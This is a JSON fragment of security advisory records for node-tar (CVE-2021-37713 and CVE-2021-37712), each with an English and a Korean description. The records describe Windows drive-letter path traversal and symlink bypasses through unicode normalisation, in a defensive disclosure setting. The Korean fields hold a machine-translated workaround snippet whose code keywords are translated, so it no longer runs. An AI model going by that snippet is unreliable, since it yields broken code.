    "publishedAt": "2021-08-31T16:05:05Z",
    "references": "https://github.com/npm/node-tar/security/advisories/GHSA-5955-9wpr-37jh\nhttps://www.npmjs.com/package/tar\nhttps://nvd.nist.gov/vuln/detail/CVE-2021-37713\nhttps://www.oracle.com/security-alerts/cpuoct2021.html\nhttps://cert-portal.siemens.com/productcert/pdf/ssa-389290.pdf\nhttps://github.com/isaacs/node-tar/commit/52b09e309bcae0c741a7eb79a17ef36e7828b946\nhttps://github.com/isaacs/node-tar/commit/82eac952f7c10765969ed464e549375854b26edc\nhttps://github.com/isaacs/node-tar/commit/875a37e3ec031186fc6599f6807341f56c584598\nhttps://github.com/advisories/GHSA-5955-9wpr-37jh",
    "name": "tar",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 6.0.0, < 6.1.9",
    "identifier": "6.1.9",
    "descriptionKR": "### 영향\n\n임의 파일 생성, 임의 파일 덮어쓰기, 임의 코드 실행\n\nnode-tar는 위치가 추출 대상 디렉토리 외부에 있는 파일이 추출되지 않도록 보장하는 것을 목표로 합니다. 이는 부분적으로 아카이브 내 항목의 절대 경로를 삭제하고 `..` 경로 부분을 포함하는 아카이브 항목을 건너뛰고 추출 대상 디렉토리에 대해 삭제된 경로를 확인하여 수행됩니다.\n\n이 논리는 절대 경로가 아닌 경로가 포함된 tar 파일을 추출할 때 Windows 시스템에서 충분하지 않았지만 `C:some\\path`와 같이 추출 대상과 다른 드라이브 문자를 지정했습니다. 드라이브 문자가 추출 대상과 일치하지 않는 경우(예: `D:\\extraction\\dir`) `path.resolve(extractionDirectory, entryPath)`의 결과는 `C:` 드라이브의 현재 작업 디렉터리에 대해 확인됩니다. , 추출 대상 디렉토리가 아닌.\n\n또한 경로의 `..` 부분은 `C:../foo`와 같이 드라이브 문자 바로 뒤에 발생할 수 있으며 정규화 및 분할 내에서 `..`를 확인하는 논리에 의해 제대로 정리되지 않았습니다. 경로의 일부.\n\n이는 Windows 시스템의 `node-tar` 사용자에게만 영향을 미칩니다.\n\n### 패치\n\n4.4.18 || 5.0.10 || 6.1.9\n\n### 해결 방법\n\n현재 node-tar에서 수행하는 것과 동일한 경로 정규화 절차를 수행하지 않고는 이 문제를 해결할 합리적인 방법이 없습니다.\n\n사용자는 경로 자체를 삭제하려고 시도하기보다는 최신 패치 버전의 node-tar로 업그레이드하는 것이 좋습니다.\n\n### 고치다\n\n고정 버전은 이러한 경로가 \"절대\"가 아니더라도 추출 대상 폴더에 대해 확인되기 전에 모든 경로에서 경로 루트를 제거합니다.\n\n또한 `c:../`와 같이 드라이브 문자로 시작하고 두 개의 점으로 시작하는 경로는 `..` 경로 부분에 대한 검사를 우회합니다. 이것은 패치된 버전에서 제대로 확인됩니다.\n\n마지막으로 'entry.absolute'가 추출 대상 외부에 있고 우리가 preservePaths:true 모드에 있지 않은 경우 해당 항목에 대한 경고가 발생하고 건너뛰도록 심층 검사 방어가 추가되었습니다. 현재 이 검사는 중복된 것으로 여겨지지만 개발 과정에서 일부 실수를 발견했습니다."
  },
  {
    "description": "### Impact\n\nArbitrary File Creation, Arbitrary File Overwrite, Arbitrary Code Execution\n\nnode-tar aims to guarantee that any file whose location would be outside of the extraction target directory is not extracted. This is, in part, accomplished by sanitizing absolute paths of entries within the archive, skipping archive entries that contain `..` path portions, and resolving the sanitized paths against the extraction target directory.\n\nThis logic was insufficient on Windows systems when extracting tar files that contained a path that was not an absolute path, but specified a drive letter different from the extraction target, such as `C:some\\path`.  If the drive letter does not match the extraction target, for example `D:\\extraction\\dir`, then the result of `path.resolve(extractionDirectory, entryPath)` would resolve against the current working directory on the `C:` drive, rather than the extraction target directory.\n\nAdditionally, a `..` portion of the path could occur immediately after the drive letter, such as `C:../foo`, and was not properly sanitized by the logic that checked for `..` within the normalized and split portions of the path.\n\nThis only affects users of `node-tar` on Windows systems.\n\n### Patches\n\n4.4.18 || 5.0.10 || 6.1.9\n\n### Workarounds\n\nThere is no reasonable way to work around this issue without performing the same path normalization procedures that node-tar now does.\n\nUsers are encouraged to upgrade to the latest patched versions of node-tar, rather than attempt to sanitize paths themselves.\n\n### Fix\n\nThe fixed versions strip path roots from all paths prior to being resolved against the extraction target folder, even if such paths are not \"absolute\".\n\nAdditionally, a path starting with a drive letter and then two dots, like `c:../`, would bypass the check for `..` path portions.  This is checked properly in the patched versions.\n\nFinally, a defense in depth check is added, such that if the `entry.absolute` is outside of the extraction taret, and we are not in preservePaths:true mode, a warning is raised on that entry, and it is skipped.  Currently, it is believed that this check is redundant, but it did catch some oversights in development.\n",
    "identifiers": "GHSA : GHSA-5955-9wpr-37jh\nCVE : CVE-2021-37713",
    "severity": "HIGH",
    "updatedAt": "2023-03-13T21:47:38Z",
    "publishedAt": "2021-08-31T16:05:05Z",
    "references": "https://github.com/npm/node-tar/security/advisories/GHSA-5955-9wpr-37jh\nhttps://www.npmjs.com/package/tar\nhttps://nvd.nist.gov/vuln/detail/CVE-2021-37713\nhttps://www.oracle.com/security-alerts/cpuoct2021.html\nhttps://cert-portal.siemens.com/productcert/pdf/ssa-389290.pdf\nhttps://github.com/isaacs/node-tar/commit/52b09e309bcae0c741a7eb79a17ef36e7828b946\nhttps://github.com/isaacs/node-tar/commit/82eac952f7c10765969ed464e549375854b26edc\nhttps://github.com/isaacs/node-tar/commit/875a37e3ec031186fc6599f6807341f56c584598\nhttps://github.com/advisories/GHSA-5955-9wpr-37jh",
    "name": "tar",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 5.0.0, < 5.0.10",
    "identifier": "5.0.10",
    "descriptionKR": "### 영향\n\n임의 파일 생성, 임의 파일 덮어쓰기, 임의 코드 실행\n\nnode-tar는 위치가 추출 대상 디렉토리 외부에 있는 파일이 추출되지 않도록 보장하는 것을 목표로 합니다. 이는 부분적으로 아카이브 내 항목의 절대 경로를 삭제하고 `..` 경로 부분을 포함하는 아카이브 항목을 건너뛰고 추출 대상 디렉토리에 대해 삭제된 경로를 확인하여 수행됩니다.\n\n이 논리는 절대 경로가 아닌 경로가 포함된 tar 파일을 추출할 때 Windows 시스템에서 충분하지 않았지만 `C:some\\path`와 같이 추출 대상과 다른 드라이브 문자를 지정했습니다. 드라이브 문자가 추출 대상과 일치하지 않는 경우(예: `D:\\extraction\\dir`) `path.resolve(extractionDirectory, entryPath)`의 결과는 `C:` 드라이브의 현재 작업 디렉터리에 대해 확인됩니다. , 추출 대상 디렉토리가 아닌.\n\n또한 경로의 `..` 부분은 `C:../foo`와 같이 드라이브 문자 바로 뒤에 발생할 수 있으며 정규화 및 분할 내에서 `..`를 확인하는 논리에 의해 제대로 정리되지 않았습니다. 경로의 일부.\n\n이는 Windows 시스템의 `node-tar` 사용자에게만 영향을 미칩니다.\n\n### 패치\n\n4.4.18 || 5.0.10 || 6.1.9\n\n### 해결 방법\n\n현재 node-tar에서 수행하는 것과 동일한 경로 정규화 절차를 수행하지 않고는 이 문제를 해결할 합리적인 방법이 없습니다.\n\n사용자는 경로 자체를 삭제하려고 시도하기보다는 최신 패치 버전의 node-tar로 업그레이드하는 것이 좋습니다.\n\n### 고치다\n\n고정 버전은 이러한 경로가 \"절대\"가 아니더라도 추출 대상 폴더에 대해 확인되기 전에 모든 경로에서 경로 루트를 제거합니다.\n\n또한 `c:../`와 같이 드라이브 문자로 시작하고 두 개의 점으로 시작하는 경로는 `..` 경로 부분에 대한 검사를 우회합니다. 이것은 패치된 버전에서 제대로 확인됩니다.\n\n마지막으로 'entry.absolute'가 추출 대상 외부에 있고 우리가 preservePaths:true 모드에 있지 않은 경우 해당 항목에 대한 경고가 발생하고 건너뛰도록 심층 검사 방어가 추가되었습니다. 현재 이 검사는 중복된 것으로 여겨지지만 개발 과정에서 일부 실수를 발견했습니다."
  },
  {
    "description": "### Impact\n\nArbitrary File Creation, Arbitrary File Overwrite, Arbitrary Code Execution\n\nnode-tar aims to guarantee that any file whose location would be outside of the extraction target directory is not extracted. This is, in part, accomplished by sanitizing absolute paths of entries within the archive, skipping archive entries that contain `..` path portions, and resolving the sanitized paths against the extraction target directory.\n\nThis logic was insufficient on Windows systems when extracting tar files that contained a path that was not an absolute path, but specified a drive letter different from the extraction target, such as `C:some\\path`.  If the drive letter does not match the extraction target, for example `D:\\extraction\\dir`, then the result of `path.resolve(extractionDirectory, entryPath)` would resolve against the current working directory on the `C:` drive, rather than the extraction target directory.\n\nAdditionally, a `..` portion of the path could occur immediately after the drive letter, such as `C:../foo`, and was not properly sanitized by the logic that checked for `..` within the normalized and split portions of the path.\n\nThis only affects users of `node-tar` on Windows systems.\n\n### Patches\n\n4.4.18 || 5.0.10 || 6.1.9\n\n### Workarounds\n\nThere is no reasonable way to work around this issue without performing the same path normalization procedures that node-tar now does.\n\nUsers are encouraged to upgrade to the latest patched versions of node-tar, rather than attempt to sanitize paths themselves.\n\n### Fix\n\nThe fixed versions strip path roots from all paths prior to being resolved against the extraction target folder, even if such paths are not \"absolute\".\n\nAdditionally, a path starting with a drive letter and then two dots, like `c:../`, would bypass the check for `..` path portions.  This is checked properly in the patched versions.\n\nFinally, a defense in depth check is added, such that if the `entry.absolute` is outside of the extraction taret, and we are not in preservePaths:true mode, a warning is raised on that entry, and it is skipped.  Currently, it is believed that this check is redundant, but it did catch some oversights in development.\n",
    "identifiers": "GHSA : GHSA-5955-9wpr-37jh\nCVE : CVE-2021-37713",
    "severity": "HIGH",
    "updatedAt": "2023-03-13T21:47:38Z",
    "publishedAt": "2021-08-31T16:05:05Z",
    "references": "https://github.com/npm/node-tar/security/advisories/GHSA-5955-9wpr-37jh\nhttps://www.npmjs.com/package/tar\nhttps://nvd.nist.gov/vuln/detail/CVE-2021-37713\nhttps://www.oracle.com/security-alerts/cpuoct2021.html\nhttps://cert-portal.siemens.com/productcert/pdf/ssa-389290.pdf\nhttps://github.com/isaacs/node-tar/commit/52b09e309bcae0c741a7eb79a17ef36e7828b946\nhttps://github.com/isaacs/node-tar/commit/82eac952f7c10765969ed464e549375854b26edc\nhttps://github.com/isaacs/node-tar/commit/875a37e3ec031186fc6599f6807341f56c584598\nhttps://github.com/advisories/GHSA-5955-9wpr-37jh",
    "name": "tar",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 4.4.18",
    "identifier": "4.4.18",
    "descriptionKR": "### 영향\n\n임의 파일 생성, 임의 파일 덮어쓰기, 임의 코드 실행\n\nnode-tar는 위치가 추출 대상 디렉토리 외부에 있는 파일이 추출되지 않도록 보장하는 것을 목표로 합니다. 이는 부분적으로 아카이브 내 항목의 절대 경로를 삭제하고 `..` 경로 부분을 포함하는 아카이브 항목을 건너뛰고 추출 대상 디렉토리에 대해 삭제된 경로를 확인하여 수행됩니다.\n\n이 논리는 절대 경로가 아닌 경로가 포함된 tar 파일을 추출할 때 Windows 시스템에서 충분하지 않았지만 `C:some\\path`와 같이 추출 대상과 다른 드라이브 문자를 지정했습니다. 드라이브 문자가 추출 대상과 일치하지 않는 경우(예: `D:\\extraction\\dir`) `path.resolve(extractionDirectory, entryPath)`의 결과는 `C:` 드라이브의 현재 작업 디렉터리에 대해 확인됩니다. , 추출 대상 디렉토리가 아닌.\n\n또한 경로의 `..` 부분은 `C:../foo`와 같이 드라이브 문자 바로 뒤에 발생할 수 있으며 정규화 및 분할 내에서 `..`를 확인하는 논리에 의해 제대로 정리되지 않았습니다. 경로의 일부.\n\n이는 Windows 시스템의 `node-tar` 사용자에게만 영향을 미칩니다.\n\n### 패치\n\n4.4.18 || 5.0.10 || 6.1.9\n\n### 해결 방법\n\n현재 node-tar에서 수행하는 것과 동일한 경로 정규화 절차를 수행하지 않고는 이 문제를 해결할 합리적인 방법이 없습니다.\n\n사용자는 경로 자체를 삭제하려고 시도하기보다는 최신 패치 버전의 node-tar로 업그레이드하는 것이 좋습니다.\n\n### 고치다\n\n고정 버전은 이러한 경로가 \"절대\"가 아니더라도 추출 대상 폴더에 대해 확인되기 전에 모든 경로에서 경로 루트를 제거합니다.\n\n또한 `c:../`와 같이 드라이브 문자로 시작하고 두 개의 점으로 시작하는 경로는 `..` 경로 부분에 대한 검사를 우회합니다. 이것은 패치된 버전에서 제대로 확인됩니다.\n\n마지막으로 'entry.absolute'가 추출 대상 외부에 있고 우리가 preservePaths:true 모드에 있지 않은 경우 해당 항목에 대한 경고가 발생하고 건너뛰도록 심층 검사 방어가 추가되었습니다. 현재 이 검사는 중복된 것으로 여겨지지만 개발 과정에서 일부 실수를 발견했습니다."
  },
  {
    "description": "### Impact\nArbitrary File Creation, Arbitrary File Overwrite, Arbitrary Code Execution\n\nnode-tar aims to guarantee that any file whose location would be modified by a symbolic link is not extracted. This is, in part, achieved by ensuring that extracted directories are not symlinks. Additionally, in order to prevent unnecessary stat calls to determine whether a given path is a directory, paths are cached when directories are created.\n\nThis logic was insufficient when extracting tar files that contained two directories and a symlink with names containing unicode values that normalized to the same value. Additionally, on Windows systems, long path portions would resolve to the same file system entities as their 8.3 \"short path\" counterparts. A specially crafted tar archive could thus include directories with two forms of the path that resolve to the same file system entity, followed by a symbolic link with a name in the first form, lastly followed by a file using the second form. It led to bypassing node-tar symlink checks on directories, essentially allowing an untrusted tar file to symlink into an arbitrary location and subsequently extracting arbitrary files into that location, thus allowing arbitrary file creation and overwrite.\n\nThe v3 branch of `node-tar` has been deprecated and did not receive patches for these issues. If you are still using a v3 release we recommend you update to a more recent version of `node-tar`. If this is not possible, a workaround is available below.\n\n### Patches\n\n6.1.9 || 5.0.10 || 4.4.18\n\n### Workarounds\n\nUsers may work around this vulnerability without upgrading by creating a custom filter method which prevents the extraction of symbolic links.\n\n```js\nconst tar = require('tar')\n\ntar.x({\n  file: 'archive.tgz',\n  filter: (file, entry) => {\n    if (entry.type === 'SymbolicLink') {\n      return false\n    } else {\n      return true\n    }\n  }\n})\n```\n\nUsers are encouraged to upgrade to the latest patched versions, rather than attempt to sanitize tar input themselves.\n\n#### Fix\n\nThe problem is addressed in the following ways, when comparing paths in the directory cache and path reservation systems:\n\n1. The `String.normalize('NFKD')` method is used to first normalize all unicode to its maximally compatible and multi-code-point form.\n2. All slashes are normalized to `/` on Windows systems (on posix systems, `\\` is a valid filename character, and thus left intact).\n3. When a symbolic link is encountered on Windows systems, the entire directory cache is cleared.  Collisions related to use of 8.3 short names to replace directories with other (non-symlink) types of entries may make archives fail to extract properly, but will not result in arbitrary file writes.\n",
    "identifiers": "GHSA : GHSA-qq89-hq3f-393p\nCVE : CVE-2021-37712",
    "severity": "HIGH",
    "updatedAt": "2023-03-13T21:45:48Z",
    "publishedAt": "2021-08-31T16:05:17Z",
    "references": "https://github.com/npm/node-tar/security/advisories/GHSA-qq89-hq3f-393p\nhttps://www.npmjs.com/package/tar\nhttps://nvd.nist.gov/vuln/detail/CVE-2021-37712\nhttps://www.oracle.com/security-alerts/cpuoct2021.html\nhttps://www.debian.org/security/2021/dsa-5008\nhttps://cert-portal.siemens.com/productcert/pdf/ssa-389290.pdf\nhttps://lists.debian.org/debian-lts-announce/2022/12/msg00023.html\nhttps://github.com/isaacs/node-tar/commit/1739408d3122af897caefd09662bce2ea477533b\nhttps://github.com/isaacs/node-tar/commit/b6162c7fafe797f856564ef37f4b82747f051455\nhttps://github.com/isaacs/node-tar/commit/bb93ba243746f705092905da1955ac3b0509ba1e\nhttps://github.com/advisories/GHSA-qq89-hq3f-393p",
    "name": "tar",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 6.0.0, < 6.1.9",
    "identifier": "6.1.9",
    "descriptionKR": "### 영향\n임의 파일 생성, 임의 파일 덮어쓰기, 임의 코드 실행\n\nnode-tar는 심볼릭 링크에 의해 위치가 수정되는 파일이 추출되지 않도록 보장하는 것을 목표로 합니다. 이것은 부분적으로 추출된 디렉토리가 심볼릭 링크가 아닌지 확인함으로써 달성됩니다. 또한 주어진 경로가 디렉토리인지 여부를 확인하기 위한 불필요한 stat 호출을 방지하기 위해 디렉토리가 생성될 때 경로가 캐시됩니다.\n\n이 논리는 동일한 값으로 정규화된 유니코드 값을 포함하는 이름이 포함된 symlink와 두 개의 디렉터리가 포함된 tar 파일을 추출할 때 충분하지 않았습니다. 또한 Windows 시스템에서 긴 경로 부분은 8.3 \"짧은 경로\" 부분과 동일한 파일 시스템 엔티티로 확인됩니다. 따라서 특별히 제작된 tar 아카이브에는 동일한 파일 시스템 엔터티로 확인되는 경로의 두 가지 형식이 있는 디렉토리가 포함될 수 있으며, 첫 번째 형식의 이름이 있는 심볼릭 링크와 두 번째 형식을 사용하는 파일이 뒤따릅니다. 이로 인해 디렉터리에 대한 node-tar symlink 검사를 우회하여 기본적으로 신뢰할 수 없는 tar 파일이 임의의 위치로 symlink되도록 허용하고 이후에 임의의 파일을 해당 위치로 추출하여 임의의 파일 생성 및 덮어쓰기를 허용했습니다.\n\n`node-tar`의 v3 브랜치는 더 이상 사용되지 않으며 이러한 문제에 대한 패치를 받지 못했습니다. 아직 v3 릴리스를 사용 중인 경우 최신 버전의 `node-tar`로 업데이트하는 것이 좋습니다. 이것이 가능하지 않은 경우 아래에서 해결 방법을 사용할 수 있습니다.\n\n### 패치\n\n6.1.9 || 5.0.10 || 4.4.18\n\n### 해결 방법\n\n사용자는 심볼릭 링크 추출을 방지하는 사용자 정의 필터 방법을 생성하여 업그레이드하지 않고도 이 취약점을 해결할 수 있습니다.\n\n```js\nconst tar = 요구('타르')\n\ntar.x({\n  파일: 'archive.tgz',\n  필터: (파일, 항목) => {\n    if (entry.type === 'SymbolicLink') {\n      거짓 반환\n    } 또 다른 {\n      참을 반환\n    }\n  }\n})\n```\n\n사용자는 tar 입력 자체를 삭제하려고 시도하기보다는 최신 패치 버전으로 업그레이드하는 것이 좋습니다.\n\n#### 고치다\n\n디렉터리 캐시와 경로 예약 시스템의 경로를 비교할 때 다음과 같은 방법으로 문제가 해결됩니다.\n\n1. `String.normalize('NFKD')` 메서드는 먼저 모든 유니코드를 최대로 호환되는 다중 코드 포인트 형식으로 정규화하는 데 사용됩니다.\n2. 모든 슬래시는 Windows 시스템에서 `/`로 정규화됩니다(posix 시스템에서 `\\`는 유효한 파일 이름 문자이므로 그대로 남습니다).\n3. Windows 시스템에서 기호 링크가 발견되면 전체 디렉토리 캐시가 지워집니다. 디렉토리를 다른(심볼릭 링크가 아닌) 항목 유형으로 대체하기 위해 8.3 짧은 이름을 사용하는 것과 관련된 충돌로 인해 아카이브가 제대로 추출되지 않을 수 있지만 임의의 파일 쓰기가 발생하지는 않습니다."
  },
  {
    "description": "### Impact\nArbitrary File Creation, Arbitrary File Overwrite, Arbitrary Code Execution\n\nnode-tar aims to guarantee that any file whose location would be modified by a symbolic link is not extracted. This is, in part, achieved by ensuring that extracted directories are not symlinks. Additionally, in order to prevent unnecessary stat calls to determine whether a given path is a directory, paths are cached when directories are created.\n\nThis logic was insufficient when extracting tar files that contained two directories and a symlink with names containing unicode values that normalized to the same value. Additionally, on Windows systems, long path portions would resolve to the same file system entities as their 8.3 \"short path\" counterparts. A specially crafted tar archive could thus include directories with two forms of the path that resolve to the same file system entity, followed by a symbolic link with a name in the first form, lastly followed by a file using the second form. It led to bypassing node-tar symlink checks on directories, essentially allowing an untrusted tar file to symlink into an arbitrary location and subsequently extracting arbitrary files into that location, thus allowing arbitrary file creation and overwrite.\n\nThe v3 branch of `node-tar` has been deprecated and did not receive patches for these issues. If you are still using a v3 release we recommend you update to a more recent version of `node-tar`. If this is not possible, a workaround is available below.\n\n### Patches\n\n6.1.9 || 5.0.10 || 4.4.18\n\n### Workarounds\n\nUsers may work around this vulnerability without upgrading by creating a custom filter method which prevents the extraction of symbolic links.\n\n```js\nconst tar = require('tar')\n\ntar.x({\n  file: 'archive.tgz',\n  filter: (file, entry) => {\n    if (entry.type === 'SymbolicLink') {\n      return false\n    } else {\n      return true\n    }\n  }\n})\n```\n\nUsers are encouraged to upgrade to the latest patched versions, rather than attempt to sanitize tar input themselves.\n\n#### Fix\n\nThe problem is addressed in the following ways, when comparing paths in the directory cache and path reservation systems:\n\n1. The `String.normalize('NFKD')` method is used to first normalize all unicode to its maximally compatible and multi-code-point form.\n2. All slashes are normalized to `/` on Windows systems (on posix systems, `\\` is a valid filename character, and thus left intact).\n3. When a symbolic link is encountered on Windows systems, the entire directory cache is cleared.  Collisions related to use of 8.3 short names to replace directories with other (non-symlink) types of entries may make archives fail to extract properly, but will not result in arbitrary file writes.\n",
    "identifiers": "GHSA : GHSA-qq89-hq3f-393p\nCVE : CVE-2021-37712",
    "severity": "HIGH",
    "updatedAt": "2023-03-13T21:45:48Z",
    "publishedAt": "2021-08-31T16:05:17Z",
    "references": "https://github.com/npm/node-tar/security/advisories/GHSA-qq89-hq3f-393p\nhttps://www.npmjs.com/package/tar\nhttps://nvd.nist.gov/vuln/detail/CVE-2021-37712\nhttps://www.oracle.com/security-alerts/cpuoct2021.html\nhttps://www.debian.org/security/2021/dsa-5008\nhttps://cert-portal.siemens.com/productcert/pdf/ssa-389290.pdf\nhttps://lists.debian.org/debian-lts-announce/2022/12/msg00023.html\nhttps://github.com/isaacs/node-tar/commit/1739408d3122af897caefd09662bce2ea477533b\nhttps://github.com/isaacs/node-tar/commit/b6162c7fafe797f856564ef37f4b82747f051455\nhttps://github.com/isaacs/node-tar/commit/bb93ba243746f705092905da1955ac3b0509ba1e\nhttps://github.com/advisories/GHSA-qq89-hq3f-393p",
    "name": "tar",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 5.0.0, < 5.0.10",
    "identifier": "5.0.10",
    "descriptionKR": "### 영향\n임의 파일 생성, 임의 파일 덮어쓰기, 임의 코드 실행\n\nnode-tar는 심볼릭 링크에 의해 위치가 수정되는 파일이 추출되지 않도록 보장하는 것을 목표로 합니다. 이것은 부분적으로 추출된 디렉토리가 심볼릭 링크가 아닌지 확인함으로써 달성됩니다. 또한 주어진 경로가 디렉토리인지 여부를 확인하기 위한 불필요한 stat 호출을 방지하기 위해 디렉토리가 생성될 때 경로가 캐시됩니다.\n\n이 논리는 동일한 값으로 정규화된 유니코드 값을 포함하는 이름이 포함된 symlink와 두 개의 디렉터리가 포함된 tar 파일을 추출할 때 충분하지 않았습니다. 또한 Windows 시스템에서 긴 경로 부분은 8.3 \"짧은 경로\" 부분과 동일한 파일 시스템 엔티티로 확인됩니다. 따라서 특별히 제작된 tar 아카이브에는 동일한 파일 시스템 엔터티로 확인되는 경로의 두 가지 형식이 있는 디렉토리가 포함될 수 있으며, 첫 번째 형식의 이름이 있는 심볼릭 링크와 두 번째 형식을 사용하는 파일이 뒤따릅니다. 이로 인해 디렉터리에 대한 node-tar symlink 검사를 우회하여 기본적으로 신뢰할 수 없는 tar 파일이 임의의 위치로 symlink되도록 허용하고 이후에 임의의 파일을 해당 위치로 추출하여 임의의 파일 생성 및 덮어쓰기를 허용했습니다.\n\n`node-tar`의 v3 브랜치는 더 이상 사용되지 않으며 이러한 문제에 대한 패치를 받지 못했습니다. 아직 v3 릴리스를 사용 중인 경우 최신 버전의 `node-tar`로 업데이트하는 것이 좋습니다. 이것이 가능하지 않은 경우 아래에서 해결 방법을 사용할 수 있습니다.\n\n### 패치\n\n6.1.9 || 5.0.10 || 4.4.18\n\n### 해결 방법\n\n사용자는 심볼릭 링크 추출을 방지하는 사용자 정의 필터 방법을 생성하여 업그레이드하지 않고도 이 취약점을 해결할 수 있습니다.\n\n```js\nconst tar = 요구('타르')\n\ntar.x({\n  파일: 'archive.tgz',\n  필터: (파일, 항목) => {\n    if (entry.type === 'SymbolicLink') {\n      거짓 반환\n    } 또 다른 {\n      참을 반환\n    }\n  }\n})\n```\n\n사용자는 tar 입력 자체를 삭제하려고 시도하기보다는 최신 패치 버전으로 업그레이드하는 것이 좋습니다.\n\n#### 고치다\n\n디렉터리 캐시와 경로 예약 시스템의 경로를 비교할 때 다음과 같은 방법으로 문제가 해결됩니다.\n\n1. `String.normalize('NFKD')` 메서드는 먼저 모든 유니코드를 최대로 호환되는 다중 코드 포인트 형식으로 정규화하는 데 사용됩니다.\n2. 모든 슬래시는 Windows 시스템에서 `/`로 정규화됩니다(posix 시스템에서 `\\`는 유효한 파일 이름 문자이므로 그대로 남습니다).\n3. Windows 시스템에서 기호 링크가 발견되면 전체 디렉토리 캐시가 지워집니다. 디렉토리를 다른(심볼릭 링크가 아닌) 항목 유형으로 대체하기 위해 8.3 짧은 이름을 사용하는 것과 관련된 충돌로 인해 아카이브가 제대로 추출되지 않을 수 있지만 임의의 파일 쓰기가 발생하지는 않습니다."
  },
  {
    "description": "### Impact\nArbitrary File Creation, Arbitrary File Overwrite, Arbitrary Code Execution\n\nnode-tar aims to guarantee that any file whose location would be modified by a symbolic link is not extracted. This is, in part, achieved by ensuring that extracted directories are not symlinks. Additionally, in order to prevent unnecessary stat calls to determine whether a given path is a directory, paths are cached when directories are created.\n\nThis logic was insufficient when extracting tar files that contained two directories and a symlink with names containing unicode values that normalized to the same value. Additionally, on Windows systems, long path portions would resolve to the same file system entities as their 8.3 \"short path\" counterparts. A specially crafted tar archive could thus include directories with two forms of the path that resolve to the same file system entity, followed by a symbolic link with a name in the first form, lastly followed by a file using the second form. It led to bypassing node-tar symlink checks on directories, essentially allowing an untrusted tar file to symlink into an arbitrary location and subsequently extracting arbitrary files into that location, thus allowing arbitrary file creation and overwrite.\n\nThe v3 branch of `node-tar` has been deprecated and did not receive patches for these issues. If you are still using a v3 release we recommend you update to a more recent version of `node-tar`. If this is not possible, a workaround is available below.\n\n### Patches\n\n6.1.9 || 5.0.10 || 4.4.18\n\n### Workarounds\n\nUsers may work around this vulnerability without upgrading by creating a custom filter method which prevents the extraction of symbolic links.\n\n```js\nconst tar = require('tar')\n\ntar.x({\n  file: 'archive.tgz',\n  filter: (file, entry) => {\n    if (entry.type === 'SymbolicLink') {\n      return false\n    } else {\n      return true\n    }\n  }\n})\n```\n\nUsers are encouraged to upgrade to the latest patched versions, rather than attempt to sanitize tar input themselves.\n\n#### Fix\n\nThe problem is addressed in the following ways, when comparing paths in the directory cache and path reservation systems:\n\n1. The `String.normalize('NFKD')` method is used to first normalize all unicode to its maximally compatible and multi-code-point form.\n2. All slashes are normalized to `/` on Windows systems (on posix systems, `\\` is a valid filename character, and thus left intact).\n3. When a symbolic link is encountered on Windows systems, the entire directory cache is cleared.  Collisions related to use of 8.3 short names to replace directories with other (non-symlink) types of entries may make archives fail to extract properly, but will not result in arbitrary file writes.\n",
    "identifiers": "GHSA : GHSA-qq89-hq3f-393p\nCVE : CVE-2021-37712",
    "severity": "HIGH",
    "updatedAt": "2023-03-13T21:45:48Z",
    "publishedAt": "2021-08-31T16:05:17Z",
    "references": "https://github.com/npm/node-tar/security/advisories/GHSA-qq89-hq3f-393p\nhttps://www.npmjs.com/package/tar\nhttps://nvd.nist.gov/vuln/detail/CVE-2021-37712\nhttps://www.oracle.com/security-alerts/cpuoct2021.html\nhttps://www.debian.org/security/2021/dsa-5008\nhttps://cert-portal.siemens.com/productcert/pdf/ssa-389290.pdf\nhttps://lists.debian.org/debian-lts-announce/2022/12/msg00023.html\nhttps://github.com/isaacs/node-tar/commit/1739408d3122af897caefd09662bce2ea477533b\nhttps://github.com/isaacs/node-tar/commit/b6162c7fafe797f856564ef37f4b82747f051455\nhttps://github.com/isaacs/node-tar/commit/bb93ba243746f705092905da1955ac3b0509ba1e\nhttps://github.com/advisories/GHSA-qq89-hq3f-393p",
    "name": "tar",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 4.4.18",
    "identifier": "4.4.18",
    "descriptionKR": "### 영향\n임의 파일 생성, 임의 파일 덮어쓰기, 임의 코드 실행\n\nnode-tar는 심볼릭 링크에 의해 위치가 수정되는 파일이 추출되지 않도록 보장하는 것을 목표로 합니다. 이것은 부분적으로 추출된 디렉토리가 심볼릭 링크가 아닌지 확인함으로써 달성됩니다. 또한 주어진 경로가 디렉토리인지 여부를 확인하기 위한 불필요한 stat 호출을 방지하기 위해 디렉토리가 생성될 때 경로가 캐시됩니다.\n\n이 논리는 동일한 값으로 정규화된 유니코드 값을 포함하는 이름이 포함된 symlink와 두 개의 디렉터리가 포함된 tar 파일을 추출할 때 충분하지 않았습니다. 또한 Windows 시스템에서 긴 경로 부분은 8.3 \"짧은 경로\" 부분과 동일한 파일 시스템 엔티티로 확인됩니다. 따라서 특별히 제작된 tar 아카이브에는 동일한 파일 시스템 엔터티로 확인되는 경로의 두 가지 형식이 있는 디렉토리가 포함될 수 있으며, 첫 번째 형식의 이름이 있는 심볼릭 링크와 두 번째 형식을 사용하는 파일이 뒤따릅니다. 이로 인해 디렉터리에 대한 node-tar symlink 검사를 우회하여 기본적으로 신뢰할 수 없는 tar 파일이 임의의 위치로 symlink되도록 허용하고 이후에 임의의 파일을 해당 위치로 추출하여 임의의 파일 생성 및 덮어쓰기를 허용했습니다.\n\n`node-tar`의 v3 브랜치는 더 이상 사용되지 않으며 이러한 문제에 대한 패치를 받지 못했습니다. 아직 v3 릴리스를 사용 중인 경우 최신 버전의 `node-tar`로 업데이트하는 것이 좋습니다. 이것이 가능하지 않은 경우 아래에서 해결 방법을 사용할 수 있습니다.\n\n### 패치\n\n6.1.9 || 5.0.10 || 4.4.18\n\n### 해결 방법\n\n사용자는 심볼릭 링크 추출을 방지하는 사용자 정의 필터 방법을 생성하여 업그레이드하지 않고도 이 취약점을 해결할 수 있습니다.\n\n```js\nconst tar = 요구('타르')\n\ntar.x({\n  파일: 'archive.tgz',\n  필터: (파일, 항목) => {\n    if (entry.type === 'SymbolicLink') {\n      거짓 반환\n    } 또 다른 {\n      참을 반환\n    }\n  }\n})\n```\n\n사용자는 tar 입력 자체를 삭제하려고 시도하기보다는 최신 패치 버전으로 업그레이드하는 것이 좋습니다.\n\n#### 고치다\n\n디렉터리 캐시와 경로 예약 시스템의 경로를 